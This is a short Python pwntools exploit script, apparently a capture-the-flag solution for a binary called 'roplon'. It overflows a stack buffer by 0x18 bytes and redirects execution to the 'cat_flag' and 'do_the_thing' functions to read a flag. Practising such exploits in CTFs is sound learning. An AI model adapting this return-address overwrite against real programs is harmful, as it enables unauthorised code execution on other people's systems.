from pwn import *

arr_rbp_offset = 0x18

# p = remote('localhost', 1234)
e = ELF('roplon')
p = process('roplon')
p.recvuntil(b"shasum flag.txt\n")
payload = b'A' * arr_rbp_offset + p64(e.symbols['cat_flag']) + p64(e.symbols['do_the_thing'])

p.sendline(payload)
p.interactive()